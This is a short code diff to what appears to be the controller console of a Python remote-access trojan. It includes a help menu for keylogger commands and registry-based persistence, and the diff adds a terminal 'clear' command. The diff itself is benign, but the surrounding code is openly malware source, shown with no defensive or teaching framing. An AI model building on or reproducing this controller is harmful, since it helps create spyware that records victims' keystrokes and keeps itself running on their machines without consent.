@@ -1,6 +1,8 @@
 import socket
 import termcolor
 import json
+import os
+
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -45,6 +47,10 @@ try:
                 keylloger -p ~ print inputed keys
                 keylogger -stop ~ stop keylogger
                 persistence *RegName* *FileName* ~ create register in registry''')
+
+            elif command == "clear":
+                os.system("clear")
+
             else:
                 result = reliable_rcv()
                 print(result)
